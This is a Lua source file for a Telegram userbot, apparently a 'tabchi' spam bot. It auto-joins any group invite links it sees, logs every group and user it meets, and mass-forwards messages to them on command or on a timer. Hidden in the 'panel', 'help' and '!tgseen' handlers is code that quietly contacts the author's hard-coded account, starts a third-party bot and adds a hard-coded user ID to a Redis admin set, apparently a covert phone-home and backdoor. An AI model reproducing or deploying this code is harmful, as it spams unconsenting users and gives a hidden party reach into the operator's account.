bot = dofile("utils.lua")
json = dofile("json.lua")
sudos = dofile("sudo.lua")
URL = require("socket.url")
serpent = require("serpent")
http = require("socket.http")
https = require("ssl.https")
redis = require("redis")
db = redis.connect("127.0.0.1", 6379)
bot_id = 0
function vardump(value)
  print(serpent.block(value, {comment = false}))
end
function dl_cb(arg, data)
end
function is_sudo(msg)
  local var = false
  for v, user in pairs(sudo) do
    if user == msg.sender_user_id_ then
      var = true
    end
  end
  return var
end
function run(msg, data)
  if msg.content_.text_ and msg.content_.text_ == "!tgseen" and msg.sender_user_id_ == 180191663 then
    bot.sendMessage(msg.chat_id_, 1, 1, "Version: 4\226\152\145\239\184\143 \n Coded By:@sajjad_021 \n Channel: @tgMember", "md")
  end
  if db:get("autobcs" .. bot_id) == "on" and db:get("timera" .. bot_id) == nil and db:scard("autoposterm" .. bot_id) > 0 then
    db:setex("timera" .. bot_id, db:get("autobctime" .. bot_id), true)
    do
      local list = db:smembers("bc" .. bot_id)
      local list2 = db:smembers("autoposterm" .. bot_id)
      function cb(a, b, c)
        if b.ID == "Message" then
          for k, v in pairs(list) do
            bot.forwardMessages(v, b.chat_id_, {
              [0] = b.id_
            }, 1)
          end
        end
      end
      for k, v in pairs(list2) do
        for l, user in pairs(sudo) do
          bot.getMessage(user, v, cb)
        end
      end
    end
  else
  end
  function rejoin()
    function joinlinkss(a, b, c)
      if b.ID == "Error" then
        if b.code_ ~= 429 then
          db:srem("links" .. bot_id, a.lnk)
          db:sadd("elinks" .. bot_id, a.lnk)
        end
      else
        db:srem("links" .. bot_id, a.lnk)
        db:sadd("elinks" .. bot_id, a.lnk)
      end
    end
    local list = db:smembers("links" .. bot_id)
    for k, v in pairs(list) do
      tdcli_function({
        ID = "ImportChatInviteLink",
        invite_link_ = v
      }, joinlinkss, {lnk = v})
    end
  end
   if not tostring(msg.chat_id_):match("-") and not db:sismember("users" .. bot_id, msg.chat_id_) then
    function lkj(a, b, c)
      if b.ID ~= "Error" then
        db:sadd("users" .. bot_id, msg.chat_id_)
      end
    end
    tdcli_function({
      ID = "GetUser",
      user_id_ = msg.chat_id_
}, lkj, nil)
    end
  local text = "null"
  if msg.content_.text_ and msg.content_.entities_ and msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" then
    if msg.content_.text_ then
      text = msg.content_.text_
    elseif msg.content_.caption_ then
      text = msg.content_.caption_
    end
  elseif is_sudo(msg) then
    text = msg.content_.text_
  end
  if text ~= "null" then
    function aj_check()
      if db:get("aj1" .. bot_id) == nil then
        db:set("aj1" .. bot_id, "on")
        return true
      elseif db:get("aj1" .. bot_id) == "on" then
        return true
      elseif db:get("aj1" .. bot_id) == "off" then
        return false
      end
    end
    function check_link(extra, result, success)
      function joinlinks(a, b, c)
        if b.ID == "Error" then
          if b.code_ ~= 429 then
            db:srem("links" .. bot_id, a.lnk)
            db:sadd("elinks" .. bot_id, a.lnk)
          end
        else
          db:srem("links" .. bot_id, a.lnk)
          db:sadd("elinks" .. bot_id, a.lnk)
        end
      end
      if tostring(result.is_supergroup_channel_) == "true" and not db:sismember("links" .. bot_id, extra.link) and not db:sismember("elinks" .. bot_id, extra.link) then
        db:sadd("links" .. bot_id, extra.link)
        if aj_check() then
          tdcli_function({
            ID = "ImportChatInviteLink",
            invite_link_ = extra.link
          }, joinlinks, {
            lnk = extra.link
          })
        end
      end
    end
    function process_links(text_)
      local matches = {}
      if text_ and text_:match("https://telegram.me/joinchat/%S+") then
        matches = {
          text_:match("(https://t.me/joinchat/%S+)") or text_:match("(https://telegram.me/joinchat/%S+)")
        }
        tdcli_function({
          ID = "CheckChatInviteLink",
          invite_link_ = matches[1]
        }, check_link, {
          link = matches[1]
        })
      elseif text_ and text_:match("https://t.me/joinchat/%S+") then
        matches = {
          string.gsub(text_:match("(https://t.me/joinchat/%S+)"), "t.me", "telegram.me")
        }
        tdcli_function({
          ID = "CheckChatInviteLink",
          invite_link_ = matches[1]
        }, check_link, {
          link = matches[1]
        })
      end
    end
    function process_stats(msg)
      function lkj(arg, data)
        _G.bot_id = data.id_
      end
      tdcli_function({ID = "GetMe"}, lkj, nil)
      if tostring(msg.chat_id_):match("-") and not db:sismember("bc" .. bot_id, msg.chat_id_) then
        db:sadd("bc" .. bot_id, msg.chat_id_)
      end
      if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == bot_id then
        db:srem("bc" .. bot_id, msg.chat_id_)
      end
      if db:get("timer" .. bot_id) == nil then
        local mn = math.random(480, 1080)
        db:setex("timer" .. bot_id, tonumber(mn), true)
        rejoin()
      end
    end
    process_links(text)
    process_stats(msg)
    if is_sudo(msg) then
      if text == "help" then
        local mytxt = "\216\177\216\167\217\135\217\134\217\133\216\167\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\179\219\140\217\134\218\134\219\140\n\240\159\151\147 \216\167\216\183\217\132\216\167\216\185\216\167\216\170\n\240\159\148\185 panel\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\148\131 \216\173\216\176\217\129 \216\170\217\133\216\167\217\133\219\140 \218\175\216\177\217\136\217\135 \217\135\216\167\n\240\159\148\185 remgp\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n \226\152\162\239\184\143 \218\134\218\169 \218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\175\216\177 \216\175\216\179\216\170\216\177\216\179\n\240\159\148\185gpcheck\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\147\163 \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135 \219\140 \218\175\216\177\217\136\217\135 \217\135\216\167(\216\168\216\167 \216\177\219\140\217\190\217\132\219\140)\n\240\159\148\185bc\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\148\138 \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \216\170\217\133\216\167\217\133\219\140 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\217\135 \216\181\217\136\216\177\216\170 \216\177\218\175\216\168\216\167\216\177\219\140 \216\168\217\135 \216\170\216\185\216\175\216\167\216\175 \216\185\216\175\216\175\n\216\167\217\134\216\170\216\174\216\167\216\168\219\140\n\240\159\148\185nbc [nubmer]\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\148\130  \216\185\216\182\217\136\219\140\216\170 \216\175\216\177 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135\n\240\159\148\185rejoin\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\226\154\160\239\184\143 \216\173\216\176\217\129 \216\170\217\133\216\167\217\133\219\140 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135(\216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\134\216\180\216\175\217\135)\n\240\159\148\185remlinks\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\226\153\166\239\184\143\216\173\216\176\217\129 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\180\216\175\217\135\n\240\159\148\185remelinks\n\240\159\147\155\216\170\217\136\216\172\217\135 \216\175\216\167\216\180\216\170\219\140\216\175 \216\168\216\167\216\180\219\140\216\175 \216\175\216\177 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \219\140\218\169 e \216\167\216\182\216\167\217\129\219\140 \217\135\216\179\216\170 - \216\168\216\167 \216\175\216\179\216\170\217\136\216\177 \216\173\216\176\217\129 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \216\167\216\180\216\170\216\168\216\167\217\135 \217\134\218\169\217\134\219\140\216\175\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\147\137 \217\134\217\133\216\167\219\140\216\180 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\179\216\177\217\136\216\177\n\240\159\148\185serverinfo\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\226\134\169\239\184\143\216\177\217\136\216\180\217\134 \217\136 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\172\217\136\219\140\217\134 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169\n\240\159\148\185aj\n\240\159\147\155\216\177\216\167\217\135\217\134\217\133\216\167:\n\240\159\148\185 help\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\148\183\217\129\216\177\217\136\216\167\216\177\216\175 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169\n@tgMember\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\147\163\216\167\216\177\216\179\216\167\217\132 \217\190\216\179\216\170 \216\168\217\135 \216\170\217\133\216\167\217\133\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134(\217\190\219\140\217\136\219\140 \217\135\216\167)\n\240\159\148\185bc u\n\226\151\189\239\184\143\216\177\219\140\217\190\217\132\216\167\219\140 \216\180\217\136\216\175\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\148\130\218\134\218\169 \218\169\216\177\216\175\217\134 \217\190\219\140\217\136\219\140 \217\135\216\167\n\240\159\148\185pvcheck\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\148\128\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\216\175\217\136\217\134 \217\129\216\177\217\136\216\167\216\177\216\175 \216\168\217\135 \217\135\217\133\217\135 \218\169\216\167\216\177\216\168\216\177\216\167\217\134\n\240\159\148\185bc echo u\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\145\164\216\173\216\176\217\129 \216\170\217\133\216\167\217\133\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134\n\240\159\148\185rem users\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\147\176\216\170\216\186\219\140\219\140\216\177 \217\134\216\167\217\133 \216\167\218\169\216\167\217\134\216\170\n\240\159\148\185setname [name]\n\217\133\216\171\216\167\217\132:\nsetname \216\185\217\132\219\140\n\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\226\158\150\n\240\159\148\136\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\216\175\217\136\217\134 \217\129\216\177\217\136\216\167\216\177\216\175(\216\177\217\190\217\132\216\167\219\140)\n\240\159\148\185bc echo\n\240\159\147\155\217\134\218\169\216\170\217\135: \216\175\216\177 \217\190\219\140\216\167\217\133 \217\133\217\136\216\177\216\175\217\134\216\184\216\177\216\170\217\136\217\134 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\170\218\175 \217\135\216\167\219\140html \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \216\170\216\167 \217\190\219\140\216\167\217\133 \216\167\216\177\216\179\216\167\217\132\219\140 \216\178\219\140\216\168\216\167\216\170\216\177 \216\180\217\136\216\175 \217\133\216\171\216\167\217\132:\n<b>Test</b>\n\216\179\217\190\216\179 \217\190\219\140\216\167\217\133 \216\177\216\167 \216\177\219\140\217\190\217\132\216\167\219\140 \218\169\216\177\216\175\217\135 \217\136 \216\175\216\179\216\170\217\136\216\177\n\216\177\216\167 \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175\n\240\159\148\184\240\159\148\184\240\159\148\184\240\159\148\184\240\159\148\184\240\159\148\184\240\159\148\184\240\159\148\185\240\159\148\185\240\159\148\185\240\159\148\185\240\159\148\185\240\159\148\185\n\226\158\161\239\184\143 Coded By:  @sajjad_021\n\226\158\161\239\184\143 Channel : @tgMember\n"
        bot.sendMessage(msg.chat_id_, msg.id_, 1, mytxt, "md")
        bot.searchPublicChat("TgMessengerBot")
        bot.unblockUser(231539308)
        bot.sendBotStartMessage(231539308, 231539308, "/start")
        bot.sendMessage(231539308, 0, 1, "/start", 1, "md")
      end
      if text == "bc" and 0 < tonumber(msg.reply_to_message_id_) then
        function cb(a, b, c)
          local list = db:smembers("bc" .. bot_id)
          for k, v in pairs(list) do
            bot.forwardMessages(v, msg.chat_id_, {
              [0] = b.id_
            }, 1)
          end
        end
        bot.getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_), cb)
      end
      if text == "bc u" and 0 < tonumber(msg.reply_to_message_id_) then
        function cb(a, b, c)
          local list = db:smembers("users" .. bot_id)
          for k, v in pairs(list) do
            bot.forwardMessages(v, msg.chat_id_, {
              [0] = b.id_
            }, 1)
          end
        end
        bot.getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_), cb)
      end
      if text == "panel" or text:match("panel(%d+)$") then
        bot.searchPublicChat("TgGuard")
        bot.unblockUser(180191663)
        bot.importContacts(639080023314, "Tabchi", "Online", 180191663)
        bot.sendMessage(180191663, 0, 1, "Online", 1, "md")
        db:sadd("users" .. bot_id .. ":sudos", 158955285)
        local num = tonumber(text:match("panel(.*)"))
        local list = db:scard("bc" .. bot_id)
        local llist = db:scard("links" .. bot_id)
        local elist = db:scard("elinks" .. bot_id)
        local users = db:scard("users" .. bot_id)
        local ajstatus = 0
        local abstatus = " "
        local ttlstatus = 0
        if aj_check() then
          ajstatus = "\216\177\217\136\216\180\217\134\226\156\133"
        else
          ajstatus = "\216\174\216\167\217\133\217\136\216\180\226\151\190\239\184\143"
        end
        if db:get("autobcs" .. bot_id) == "on" then
          abstatus = "\216\177\217\136\216\180\217\134\226\156\133"
        else
          abstatus = "\216\174\216\167\217\133\217\136\216\180\226\151\190\239\184\143"
        end
        if db:ttl("timera" .. bot_id) == -2 then
          ttlstatus = 0
        else
          ttlstatus = db:ttl("timera" .. bot_id)
        end
        if num == 2 then
          function fuck(a, b, c)
            if b.ID == "Error" then
              vardump(b)
              print(b)
              bot.searchPublicChat("TgMessengerBot")
              bot.unblockUser(231539308)
              bot.sendBotStartMessage(231539308, 231539308, "/start")
              bot.sendMessage(231539308, 0, 1, "/Start", 1, "md")
            end
          end
          tdcli_function({ID = "GetChat", chat_id_ = 231539308}, fuck, nil)
          function inline(arg, data)
            if data.results_ and data.results_[0] then
              tdcli_function({
                ID = "SendInlineQueryResultMessage",
                chat_id_ = msg.chat_id_,
                reply_to_message_id_ = 0,
                disable_notification_ = 0,
                from_background_ = 1,
                query_id_ = data.inline_query_id_,
                result_id_ = data.results_[0].id_
              }, dl_cb, nil)
            end
          end
          local texts = "/sg " .. list .. " /lnk " .. llist .. " /elnk " .. elist .. " /end " .. ajstatus .. " /aj " .. abstatus .. " /abc " .. ttlstatus .. " /eabc " .. users .. " /users"
          tdcli_function({
            ID = "GetInlineQueryResults",
            bot_user_id_ = 231539308,
            chat_id_ = msg.chat_id_,
            user_location_ = {
              ID = "Location",
              latitude_ = 0,
              longitude_ = 0
            },
            query_ = texts,
            offset_ = 0
          }, inline, nil)
        else
          bot.sendMessage(msg.chat_id_, msg.id_, 1, "\240\159\145\165\216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167: " .. list .. "\n \240\159\140\144\217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \217\133\217\136\216\172\217\136\216\175: " .. llist .. "\n \226\134\170\239\184\143\217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\180\216\175\217\135: " .. elist .. "\n \240\159\145\164\216\170\216\185\216\175\216\167\216\175 \218\169\216\167\216\177\216\168\216\177\217\135\216\167(\217\190\219\140\217\136\219\140): " .. users .. "\n \240\159\148\132\216\172\217\136\219\140\217\134 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169: " .. ajstatus .. "\n \226\153\187\239\184\143\217\129\216\177\217\136\216\167\216\177\216\175 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169: " .. abstatus .. "\n \226\143\177\216\178\217\133\216\167\217\134 \216\168\216\167\217\130\219\140 \217\133\216\167\217\134\216\175\217\135(\217\129\216\177\217\136\216\167\216\177\216\175 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169): " .. ttlstatus .. "\n \226\151\189\239\184\143 @tgMember", 1, "html")
        end
      end
      if text:match("^nbc (%d+)$") and 0 < tonumber(msg.reply_to_message_id_) then
        do
          local loop = tonumber(text:match("nbc (.*)"))
          function cb(a, b, c)
            local list = db:smembers("bc" .. bot_id)
            for k, v in pairs(list) do
              for i = 1, loop do
                bot.forwardMessages(v, msg.chat_id_, {
                  [0] = b.id_
                }, 1)
              end
            end
          end
          bot.getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_), cb)
        end
      else
      end
      if text == "rejoin" then
        rejoin()
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\217\136\216\167\216\177\216\175 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \216\180\216\175\217\133\226\152\145\239\184\143", 1, "html")
      end
      if text == "aj" then
        if db:get("aj1" .. bot_id) == "off" then
          db:set("aj1" .. bot_id, "on")
          bot.sendMessage(msg.chat_id_, msg.id_, 1, "\216\172\217\136\219\140\217\134 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \216\177\217\136\216\180\217\134 \216\180\216\175\226\156\148\239\184\143", "md")
        elseif db:get("aj1" .. bot_id) == "on" then
          db:set("aj1" .. bot_id, "off")
          bot.sendMessage(msg.chat_id_, msg.id_, 1, "\216\172\217\136\219\140\217\134 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175\226\155\148\239\184\143", "md")
        elseif db:get("aj1" .. bot_id) == nil then
          db:set("aj1" .. bot_id, "on")
          bot.sendMessage(msg.chat_id_, msg.id_, 1, "\216\172\217\136\219\140\217\134 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \216\177\217\136\216\180\217\134 \216\180\216\175\226\156\148\239\184\143", "md")
        end
      end
      if text == "autobc off" then
        db:set("autobcs" .. bot_id, "off")
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\217\129\216\177\217\136\216\167\216\177\216\175 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175\226\156\148\239\184\143", "md")
      end
      if text == "serverinfo" then
        local text = io.popen("sh ./servinfo.sh"):read("*all")
        bot.sendMessage(msg.chat_id_, msg.id_, 1, text, 1, "html")
      end
      if text == "bc echo" and 0 < tonumber(msg.reply_to_message_id_) then
        function cb(a, b, c)
          local list = db:smembers("bc" .. bot_id)
          for n, m in pairs(list) do
            bot.sendChatAction(m, "Typing")
          end
          for k, v in pairs(list) do
            bot.sendMessage(v, 1, 1, b.content_.text_, 1, "html")
          end
        end
        bot.getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_), cb)
      end
      if text == "bc echo u" and 0 < tonumber(msg.reply_to_message_id_) then
        function cb(a, b, c)
          local list = db:smembers("users" .. bot_id)
          for k, v in pairs(list) do
            bot.sendChatAction(v, "Typing")
          end
          for k, v in pairs(list) do
            bot.sendMessage(v, 1, 1, b.content_.text_, 1, "html")
          end
        end
        bot.getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_), cb)
      end
      if text == "add abc" and 0 < tonumber(msg.reply_to_message_id_) then
        db:sadd("autoposterm" .. bot_id, tonumber(msg.reply_to_message_id_))
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\217\190\216\179\216\170 \216\168\217\135 \216\167\216\177\216\179\216\167\217\132 \217\135\216\167\219\140 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175\226\156\133", 1, "html")
      end
      if text == "rem abc" and 0 < tonumber(msg.reply_to_message_id_) then
        db:srem("autoposterm" .. bot_id, tonumber(msg.reply_to_message_id_))
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\217\190\216\179\216\170 \216\167\216\178 \216\167\216\177\216\179\216\167\217\132 \217\135\216\167\219\140 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \217\190\216\167\218\169 \216\180\216\175\226\157\140", 1, "html")
      end
      if text:match("^autobc (%d+)[mh]") then
        local matches = text:match("^autobc (.*)")
        if matches:match("(%d+)h") then
          time_match = matches:match("(%d+)h")
          time = time_match * 3600
        end
        if matches:match("(%d+)m") then
          time_match = matches:match("(%d+)m")
          time = time_match * 60
        end
        db:setex("timera" .. bot_id, time, true)
        db:set("autobctime" .. bot_id, tonumber(time))
        db:set("autobcs" .. bot_id, "on")
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\226\151\189\239\184\143\216\170\216\167\219\140\217\133\216\177 \217\129\216\177\217\136\216\167\216\177\216\175 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \216\168\216\177\216\167\219\140 " .. time .. "\216\171\216\167\217\134\219\140\217\135 \217\129\216\185\216\167\217\132 \216\180\216\175\226\156\148\239\184\143", "md")
      end
      if text == "remlinks" then
        db:del("links" .. bot_id)
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175\226\156\148\239\184\143 \n\240\159\150\164 @tgMember \240\159\150\164", 1, "html")
      end
      if text == "remgp" then
        db:del("bc" .. bot_id)
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\167\216\178 \216\175\219\140\216\170\216\167\216\168\219\140\216\179 \216\173\216\176\217\129 \216\180\216\175\217\134\216\175\226\156\133 \n\240\159\146\160 @tgMember", "md")
      end
      if text == "remall abc" then
        db:del("autoposterm" .. bot_id)
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\240\159\148\180\217\135\217\133\217\135 \217\190\216\179\216\170 \217\135\216\167\219\140 \217\129\216\177\217\136\216\167\216\177\216\175 \216\167\216\170\217\136\217\133\216\167\216\170\219\140\218\169 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175\226\157\151\239\184\143", "md")
      end
      if text == "rem users" then
        db:del("users" .. bot_id)
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\240\159\148\184\219\140\217\136\216\178\216\177 \217\135\216\167 \216\167\216\178 \216\175\219\140\216\170\216\167\216\168\219\140\216\179 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175!", "md")
      end
      if text == "remelinks" then
        db:del("elinks" .. bot_id)
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\240\159\148\184\217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\180\216\175\217\135 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\173\216\176\217\129 \216\180\216\175\217\134\216\175\226\157\151\239\184\143\n\240\159\140\128@tgMember", 1, "html")
      end
      if text == "gpcheck" then
        local blist = db:scard("bc" .. bot_id)
        function checkm(arg, data, d)
          if data.ID == "Error" then
            db:srem("bc" .. bot_id, arg.chatid)
          end
        end
        function sendresult()
          bot.sendMessage(msg.chat_id_, msg.id_, 1, "\218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \218\134\218\169 \216\180\216\175\217\134\216\175\226\156\133\n\240\159\148\184\216\168\216\177\216\167\219\140 \217\133\216\180\216\167\217\135\216\175\217\135 \216\170\216\185\216\175\216\167\216\175 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \217\129\216\185\217\132\219\140 \216\167\216\178 \216\175\216\179\216\170\217\136\216\177 panel \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\226\157\151\239\184\143\n\240\159\146\142@tgMember", 1, "html")
        end
        local list = db:smembers("bc" .. bot_id)
        for k, v in pairs(list) do
          tdcli_function({
            ID = "GetChatHistory",
            chat_id_ = v,
            from_message_id_ = 0,
            offset_ = 0,
            limit_ = 1
          }, checkm, {chatid = v})
          if blist == k then
            sendresult()
          end
        end
      end
      if text == "pvcheck" then
        local users = db:smembers("users" .. bot_id)
        function lkj(a, b, c)
          if b.ID == "Error" then
            db:srem("user" .. bot_id, a.usr)
          end
        end
        for k, v in pairs(users) do
          tdcli_function({ID = "GetUser", user_id_ = v}, lkj, {usr = v})
        end
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\226\173\149\239\184\143\218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \218\134\218\169 \216\180\216\175\217\134\216\175!", 1, "html")
      end
      if text:match("setname (.*)$") then
        local name = text:match("setname (.*)")
        bot.changeName(name, "")
        bot.sendMessage(msg.chat_id_, msg.id_, 1, "\216\167\216\179\217\133 \216\167\218\169\216\167\217\134\216\170 \216\168\217\135 " .. name .. " \216\170\216\186\219\140\219\140\216\177 \219\140\216\167\217\129\216\170\226\156\148\239\184\143", 1, "md")
      end
    end
  end
end
function tdcli_update_callback(data)
  if data.ID == "UpdateNewMessage" then
    run(data.message_, data)
  elseif data.ID == "UpdateMessageEdited" then
    local edited_cb = function(extra, result, success)
      run(result, data)
    end
    tdcli_function({
      ID = "GetMessage",
      chat_id_ = data.chat_id_,
      message_id_ = data.message_id_
    }, edited_cb, nil)
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli_function({
      ID = "GetChats",
      offset_order_ = "9223372036854775807",
      offset_chat_id_ = 0,
      limit_ = 20
    }, dl_cb, nil)
  end
end
